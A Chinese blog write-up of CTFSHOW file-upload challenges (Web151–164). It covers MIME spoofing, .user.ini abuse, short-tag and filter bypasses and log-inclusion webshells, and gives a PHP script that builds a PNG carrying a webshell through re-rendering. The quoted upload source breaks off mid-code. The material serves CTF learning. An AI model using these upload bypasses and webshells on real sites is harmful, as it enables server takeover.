@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>CTFSHOW-文件上传 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="CTFSHOW-文件上传 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/02/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T10:13:50.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/In-Challenge/">In Challenge</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">CTFSHOW-文件上传</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="Web151（前端验证是无效的）"><a href="#Web151（前端验证是无效的）" class="headerlink" title="Web151（前端验证是无效的）"></a>Web151（前端验证是无效的）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663484213709-b8a7ffca-d13b-4e11-924f-1f1d011000df.png#averageHue=%23c4c8cb&clientId=u19715394-3d91-4&from=paste&height=188&id=ubc142434&name=image.png&originHeight=235&originWidth=1093&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8351&status=done&style=none&taskId=u1c3ab35c-0136-4c7c-8f26-e8f558ab008&title=&width=874.4" alt="image.png"><br>进入页面只让我们上传png格式的图片，我们只需要burpsuite抓包，然后用burpsuite发送绕过前端即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663484258519-84c63282-ce7e-4119-9bec-b18416863b5f.png#averageHue=%23f5f5f5&clientId=u19715394-3d91-4&from=paste&height=282&id=ua7ce2b13&name=image.png&originHeight=353&originWidth=976&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49100&status=done&style=none&taskId=uc3b4108f-0130-4f53-9fac-ffaf2b47f22&title=&width=780.8" alt="image.png"><br>最后蚁剑连接，读取flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663484273859-04e4b96a-4294-4010-9567-5a19f62168c1.png#averageHue=%23f7f7f7&clientId=u19715394-3d91-4&from=paste&height=551&id=u3bb1d3f3&name=image.png&originHeight=689&originWidth=1055&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61874&status=done&style=none&taskId=u7caeeb85-a147-4c4e-903e-e472ceb7500&title=&width=844" alt="image.png"></p>
+<h2 id="Web152（服务端MIME类）"><a href="#Web152（服务端MIME类）" class="headerlink" title="Web152（服务端MIME类）"></a>Web152（服务端MIME类）</h2><p>解法和上一题一样，先上传个png，然后抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663484585003-3451fc84-a04f-484a-a291-78d0dd7882b8.png#averageHue=%23f8f8f8&clientId=u19715394-3d91-4&from=paste&height=594&id=ub29a25c6&name=image.png&originHeight=742&originWidth=1287&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89322&status=done&style=none&taskId=ud4d4c0cb-12ea-4e7f-b4eb-ef15df4a357&title=&width=1029.6" alt="image.png"><br>把content-type改为png的格式即可<br>这里content-type的类型有：</p>
+<blockquote>
+<ul>
+<li>image&#x2F;png</li>
+<li>image&#x2F;gif</li>
+<li>jpg image&#x2F;jpeg</li>
+</ul>
+</blockquote>
+<p>最后蚁剑连接即可</p>
+<h2 id="Web153（-user-ini利用）"><a href="#Web153（-user-ini利用）" class="headerlink" title="Web153（.user.ini利用）"></a>Web153（.user.ini利用）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663486931760-8e549c59-2f7f-42fe-ad16-bae0600bc15e.png#averageHue=%23d2d6d7&clientId=ubd34bbb3-4e73-4&from=paste&height=217&id=ue8947936&name=image.png&originHeight=271&originWidth=727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8202&status=done&style=none&taskId=ue49ceedf-1292-4aa7-af70-88eacd4a7d1&title=&width=581.6" alt="image.png"></p>
+<p>这题后端改后缀不行，文件头也不行<br>这一题要用.user.ini配置文件，和.htaccess类似<br>但是有区别,.user.ini在nginx或者Apache都可以用，而.htaccess只可以用在Apache里<br>用法也几乎相似：<br>上传png文件后抓包，再跟着上传一个.user.ini文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663487021659-a258e77b-1198-4149-b3a9-10b20c9f685a.png#averageHue=%23f4f3f3&clientId=ubd34bbb3-4e73-4&from=paste&height=586&id=u77620faf&name=image.png&originHeight=733&originWidth=1296&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92211&status=done&style=none&taskId=u659d0d73-2f57-4c11-8699-6ac551e55d4&title=&width=1036.8" alt="image.png"><br>之后直接URL+&#x2F;upload就可以自动解析该文件了，这个触发需要有<code>php</code>文件，由于upload文件夹下有个index.php，所以可以使用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663487117882-24747eec-1ba9-47a9-b0da-887eb44459ff.png#averageHue=%23f5f5f5&clientId=ubd34bbb3-4e73-4&from=paste&height=544&id=u418992d3&name=image.png&originHeight=680&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50499&status=done&style=none&taskId=u76a3887d-a3bd-4ad0-b296-52aba779e63&title=&width=831.2" alt="image.png"><br>这里也可以看看他文件上传的php源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663487306100-4fb79e26-6708-4f01-87d0-b4bad59a526a.png#averageHue=%23f7f6f6&clientId=ubd34bbb3-4e73-4&from=paste&height=522&id=u2f0414d7&name=image.png&originHeight=652&originWidth=1037&originalType=binary&ratio=1&rotation=0&showTitle=false&size=116953&status=done&style=none&taskId=uc9245a8a-c4f6-44dd-bf01-68adaa9eace&title=&width=829.6" alt="image.png"><br>可以看到是把php拉入了黑名单的，所以其他方法行不通，这里后缀名只要不等于php都可以上传，然后文件类型改MIME就可以了！</p>
+<h2 id="Web154-短标签-user-ini"><a href="#Web154-短标签-user-ini" class="headerlink" title="Web154(短标签+.user.ini)"></a>Web154(短标签+.user.ini)</h2><p>抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663499700949-b429887c-0139-4b93-9d9a-a23f1ab7acb1.png#averageHue=%23f8f8f8&clientId=u85c02443-869c-4&from=paste&height=592&id=uddd95210&name=image.png&originHeight=740&originWidth=1278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83990&status=done&style=none&taskId=uf575cbb2-be0c-41ea-84ba-79f0a50d6e4&title=&width=1022.4" alt="image.png"><br>发现即使上传后缀名为png的也会失败，提示是说，<strong>文件内容出错</strong>，也就是说ban掉了什么关键字<br>经过测试发现是ban掉了php：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663499750318-b2b41b07-4716-404a-8873-ece71c69b98a.png#averageHue=%23f8f8f8&clientId=u85c02443-869c-4&from=paste&height=600&id=uc83b3ec5&name=image.png&originHeight=750&originWidth=1295&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87176&status=done&style=none&taskId=u1172238e-14f1-4a75-bfe0-4d102aef918&title=&width=1036" alt="image.png"><br>可以看到只要去掉了个p就可以继续上传了，这里就要用到短标签了：</p>
+<ol>
+<li><? ?></li>
+</ol>
+<p>前提是开启配置参数short_open_tags&#x3D;on</p>
+<ol start="2">
+<li><?= ?>等价于<? echo ?></li>
+</ol>
+<p>不需要开启参数设置</p>
+<ol start="3">
+<li>&lt;% echo 123;%&gt;</li>
+</ol>
+<p>前提是开启配置参数asp_tags&#x3D;on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。</p>
+<ol start="4">
+<li><script language="php">echo '123'; </script></li>
+</ol>
+<p>不需要修改参数开关，但是只能在7.0以下可用。</p>
+<p>随便选一种改一下，然后再上传.user.ini，最后和web153就可以蚁剑连接进去了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663499989863-5c0067c1-ca24-41f9-8f4b-9a5dfcd8eefd.png#averageHue=%23f7f7f7&clientId=u85c02443-869c-4&from=paste&height=601&id=ue1bc6a2d&name=image.png&originHeight=751&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96224&status=done&style=none&taskId=u54d93eb1-b5e9-4484-b7a7-ca40ec18d7e&title=&width=1024" alt="image.png"><br>查看一下源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663501205305-006e8cab-b918-4cf2-a8d4-aac0d1273a08.png#averageHue=%23f9f8f8&clientId=u85c02443-869c-4&from=paste&height=465&id=uce99eecd&name=image.png&originHeight=581&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121152&status=done&style=none&taskId=u6286694d-045c-4ef1-8e56-da161723134&title=&width=824.8" alt="image.png"><br>可以看到这边ban了php这个字符串</p>
+<h2 id="Web155（同上）"><a href="#Web155（同上）" class="headerlink" title="Web155（同上）"></a>Web155（同上）</h2><p>解法一致</p>
+<h2 id="Web156-同上）"><a href="#Web156-同上）" class="headerlink" title="Web156(同上）"></a>Web156(同上）</h2><p>多ban了我们的[符号<br>我们用中括号{}是等效的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663501419247-886cf4e1-f526-4f26-a62e-9de48d4ece72.png#averageHue=%23fbfaf9&clientId=u85c02443-869c-4&from=paste&height=442&id=u6303e33f&name=image.png&originHeight=553&originWidth=1020&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117513&status=done&style=none&taskId=uf9bcefc3-0c85-4f72-8473-016938de0f6&title=&width=816" alt="image.png"></p>
+<h2 id="Web157（rce）"><a href="#Web157（rce）" class="headerlink" title="Web157（rce）"></a>Web157（rce）</h2><p>这里在上一题的基础上ban掉了{,[,;<br>所以这里用不了一句话木马，那就改变思路，直接RCE了<br>在png文件里写内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663553824836-8a7092a0-89dc-4c9f-a962-ac468a967783.png#averageHue=%23f8f8f8&clientId=uda225766-308f-4&from=paste&height=571&id=ue613f0a1&name=image.png&originHeight=714&originWidth=1292&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84434&status=done&style=none&taskId=u22ae2f12-b365-49c3-b282-813e701a3c6&title=&width=1033.6" alt="image.png"><br>在写入.user.ini文件即可</p>
+<h2 id="Web158（同上）"><a href="#Web158（同上）" class="headerlink" title="Web158（同上）"></a>Web158（同上）</h2><p>解法一致</p>
+<h2 id="Web159-同上）"><a href="#Web159-同上）" class="headerlink" title="Web159(同上）"></a>Web159(同上）</h2><p>在上一题的基础上又ban掉了括号（<br>这样的话就用不了system和exec类的了<br>我们用echo <code> </code>就好了</p>
+<h2 id="Web160（包含日志文件）"><a href="#Web160（包含日志文件）" class="headerlink" title="Web160（包含日志文件）"></a>Web160（包含日志文件）</h2><p>上一题的基础上ban了反引号&#96;和log和空格<br>ban了log但是我们还是可以使用日志文件<br>我们在1.png里写下：include	 “&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.lo”.”g”即可<br>用连接符和tab分别绕过	<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663555648938-a85a68d6-a7f0-4634-9201-b5be4de7b0b5.png#averageHue=%23f7f7f7&clientId=u5269727a-5d6a-4&from=paste&height=344&id=u603dbbdc&name=image.png&originHeight=430&originWidth=1300&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66733&status=done&style=none&taskId=u19d0f22d-bf16-4b26-8fe6-a09941fd75e&title=&width=1040" alt="image.png"></p>
+<p>然后再user-agent里写下一句话木马<br>用蚁剑连接即可</p>
+<h2 id="Web161（包含日志-文件头）"><a href="#Web161（包含日志-文件头）" class="headerlink" title="Web161（包含日志+文件头）"></a>Web161（包含日志+文件头）</h2><p>再次基础上加上了文件头验证<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663558037604-7752ce05-f577-4e16-baf0-f4250523af41.png#averageHue=%23f8f7f7&clientId=u5269727a-5d6a-4&from=paste&height=581&id=u4e1dd834&name=image.png&originHeight=726&originWidth=1297&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91921&status=done&style=none&taskId=ueb941317-04fb-44c0-95ea-bb333542ac2&title=&width=1037.6" alt="image.png"><br>然后在user-agnet随便调个马上传，蚁剑连接即可<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663558172917-34812a7c-32ae-4fce-a112-c19427383a00.png#averageHue=%23faf9f9&clientId=u5269727a-5d6a-4&from=paste&height=502&id=u86efff21&name=image.png&originHeight=627&originWidth=1015&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130898&status=done&style=none&taskId=u0806da32-1ee8-4eaf-9aa0-7619466cde3&title=&width=812" alt="image.png"><br>可以看到getimagesize函数</p>
+<h2 id="Web162（远程文件包含或者条件竞争）"><a href="#Web162（远程文件包含或者条件竞争）" class="headerlink" title="Web162（远程文件包含或者条件竞争）"></a>Web162（远程文件包含或者条件竞争）</h2><p>无法做出题解，网站有问题<br>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/123506816">https://blog.csdn.net/weixin_46081055&#x2F;article&#x2F;details&#x2F;123506816</a></p>
+<h2 id="Web163（条件竞争）"><a href="#Web163（条件竞争）" class="headerlink" title="Web163（条件竞争）"></a>Web163（条件竞争）</h2><p>无法做出题解，网站有问题<br>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46081055/article/details/123506816">https://blog.csdn.net/weixin_46081055&#x2F;article&#x2F;details&#x2F;123506816</a></p>
+<h2 id="Web164（PNG图片二次渲染）"><a href="#Web164（PNG图片二次渲染）" class="headerlink" title="Web164（PNG图片二次渲染）"></a>Web164（PNG图片二次渲染）</h2><p>那那那那那啥，这一题刚开始有点懵逼，理回来了，因为涉及了盲区<br>好，入题：<br>这一题是什么情况呢，你会发现你传的假png图片不行了，你加文件头也没用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663570630741-844fb0db-ea60-4027-9c65-893175a24c50.png#averageHue=%23f7f7f7&clientId=u444fc0f9-fe6f-4&from=paste&height=612&id=u787ce2b2&name=image.png&originHeight=765&originWidth=1276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85714&status=done&style=none&taskId=u6478c108-18ee-42cd-a22f-b254ce94efb&title=&width=1020.8" alt="image.png"><br>那这就困扰了，那是不是没办法了呢？<br>上传一张图片木马看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663570783427-4efc3cba-8d4e-48a0-bb3b-77af0b672a38.png#averageHue=%2332b87a&clientId=u444fc0f9-fe6f-4&from=paste&height=353&id=ucb28e3ac&name=image.png&originHeight=441&originWidth=1215&originalType=binary&ratio=1&rotation=0&showTitle=false&size=152731&status=done&style=none&taskId=ud5efbccf-2517-4abd-a8aa-34a7c0cf24d&title=&width=972" alt="image.png"><br>进入了如下的页面，然后下载这张图片看看源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663570889454-4fab9312-e26f-4c67-beaa-a614311fb733.png#averageHue=%233a3730&clientId=u444fc0f9-fe6f-4&from=paste&height=451&id=u7ff92d35&name=image.png&originHeight=564&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126894&status=done&style=none&taskId=u67a01469-cb83-41fd-bc36-94a3690f303&title=&width=547.2" alt="image.png"><br>本应在尾部的一句话木马给刷掉了，说明这里存在二次渲染，国外大佬给的脚本生成一个图片马，可以防止被刷掉：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">             <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">             <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">             <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">             <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">             <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">             <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">             <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">  <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">  <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">  <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>查看这个图片源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663571136294-7b6ab170-37d4-48ff-b556-e72ff11daabd.png#averageHue=%233a3730&clientId=u444fc0f9-fe6f-4&from=paste&height=223&id=u6fa38c96&name=image.png&originHeight=279&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53619&status=done&style=none&taskId=u626fbf43-41b2-4969-a311-b205a1aede0&title=&width=553.6" alt="image.png"><br>可以看到中间夹了个木马，这样就可以在网站二次渲染这图片的时候运行代码，进入上传目录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663571196921-4a909673-eafa-4a1e-a517-be635175c60f.png#averageHue=%23f9f9f9&clientId=u444fc0f9-fe6f-4&from=paste&height=212&id=u2228729d&name=image.png&originHeight=265&originWidth=1360&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25854&status=done&style=none&taskId=ua2e69e08-4d82-48c2-99d0-924695869c8&title=&width=1088" alt="image.png"><br>然后抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663571250371-cdc79876-9eda-45b6-8b30-f891e7a551b1.png#averageHue=%23f7f7f7&clientId=u444fc0f9-fe6f-4&from=paste&height=304&id=ua6202829&name=image.png&originHeight=380&originWidth=1282&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52379&status=done&style=none&taskId=ue78e4634-6deb-4579-92e0-cbe870826b9&title=&width=1025.6" alt="image.png"><br>可以看到命令成功执行，接下来一步步读取答案即可！</p>
+<p>出于好奇把源码考下来了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>)))&#123;</span><br><span class="line">                <span class="variable">$png</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$png</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">imagepng</span>(<span class="variable">$png</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只允许上传png格式图片&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    		</span><br><span class="line">    	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    		<span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span 